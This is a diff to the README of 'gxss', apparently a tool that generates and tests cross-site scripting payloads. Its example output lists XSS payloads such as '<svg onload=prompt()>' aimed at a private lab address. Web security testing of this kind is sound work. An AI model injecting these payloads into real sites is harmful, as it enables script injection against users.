@@ -1,6 +1,6 @@
 # gxss
 Generate and test XSS payloads given injection points  
-DOM is evaluated by chromium, and payloads that pop `alert` or `prompt` are confirmed  
+DOM is evaluated by chromium, and payloads that pop `alert`, `prompt`, or `confirm` are confirmed  
   
 Example Input:
 ```
@@ -33,6 +33,7 @@ $ echo http://192.168.1.108:9999/home | url-miner -w testwords -json | gxss -s
 [high] http://192.168.1.108:9999/home?q=<svg onload=prompt()>
 [confirmed] http://192.168.1.108:9999/home?q=%3Csvg%20onload=prompt``%3E
 [high] http://192.168.1.108:9999/home?q=<svg onload=prompt``>
+...
 ...
 ```
 
